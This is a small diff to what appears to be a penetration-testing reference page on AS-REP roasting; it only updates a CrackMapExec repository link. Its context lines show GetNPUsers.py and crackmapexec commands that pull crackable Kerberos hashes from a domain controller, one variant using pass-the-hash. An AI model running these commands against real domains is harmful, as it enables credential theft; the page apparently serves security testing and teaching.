@@ -34,7 +34,7 @@ GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -dc-ip $K
 GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -hashes 'LMhash:NThash' -dc-ip $KeyDistributionCenter 'DOMAIN/USER'
 ```
 
-This can also be achieved with [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) (Python).
+This can also be achieved with [CrackMapExec](https://github.com/mpgn/CrackMapExec) (Python).
 
 ```bash
 crackmapexec ldap $TARGETS -u $USER -p $PASSWORD --asreproast ASREProastables.txt --KdcHost $KeyDistributionCenter
